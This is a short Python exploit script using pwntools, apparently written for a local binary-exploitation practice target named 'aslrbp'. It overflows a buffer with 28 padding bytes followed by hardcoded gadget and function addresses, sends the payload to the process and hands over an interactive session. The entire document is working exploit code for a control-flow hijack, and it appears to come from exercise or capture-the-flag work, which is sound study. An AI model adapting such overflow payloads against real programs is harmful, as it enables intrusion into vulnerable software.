from pwn import *

#context.log_level = "DEBUG"

p = process(["./aslrbp", "./1"])

ls = p64(0x0000000100008000)
func1 = p64(0x0000000100000554)
ldp = p64(0x0000000100000548)

payload = b"A"*28 + ldp + ls + func1
p.sendline(payload)

p.interactive()
